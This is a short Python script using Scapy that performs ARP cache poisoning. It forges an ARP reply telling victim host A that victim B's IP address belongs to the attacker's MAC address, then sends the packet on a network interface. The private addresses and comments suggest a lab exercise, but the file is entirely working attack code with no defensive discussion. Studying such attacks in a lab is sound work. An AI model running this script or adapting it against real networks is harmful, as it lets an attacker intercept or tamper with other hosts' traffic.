from scapy.all import *

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's IP (we're spoofing this)
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M (attacker)
m_ip    = "10.9.0.105"          # IP of M

# Forge an ARP reply to A, saying "B's IP is at M's MAC"
arp_reply = ARP(
    op=2,               # ARP reply
    psrc=b_ip,          # Claim to be B (pretending to be B IP Address)
    hwsrc=m_mac,        # Send M's MAC (attacker's MAC)
    pdst=a_ip,          # Target is A
    hwdst=a_mac         # Send directly to A's MAC 
)

eth = Ether(dst=a_mac, src=m_mac) # Send directly to A
pkt = eth / arp_reply       # Combine Ethernet and ARP layers

sendp(pkt, iface="eth0")    # Send the packet on the specified interface
